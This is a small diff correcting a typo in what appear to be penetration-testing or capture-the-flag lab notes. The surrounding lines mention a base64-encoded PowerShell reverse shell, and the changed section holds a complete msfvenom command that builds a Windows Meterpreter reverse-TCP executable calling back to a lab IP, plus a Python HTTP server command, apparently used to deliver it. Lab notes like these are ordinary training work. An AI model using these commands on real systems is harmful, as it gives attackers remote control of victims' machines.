@@ -14,7 +14,7 @@ Note: **we can use metasploit's web delivery as well**
 	- I was not able to run powershell commands or open powershell from command prompt for some reason so used base64 encoded powershell reverse shell
 		- ![[Pasted image 20250415153541.png]]
 
-- Generate meterepreter file:
+- Generate meterpreter file:
 	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=9002 -f exe -o reverse.exe`
 - Start python3 server:
 	- `python3 -m http.server`
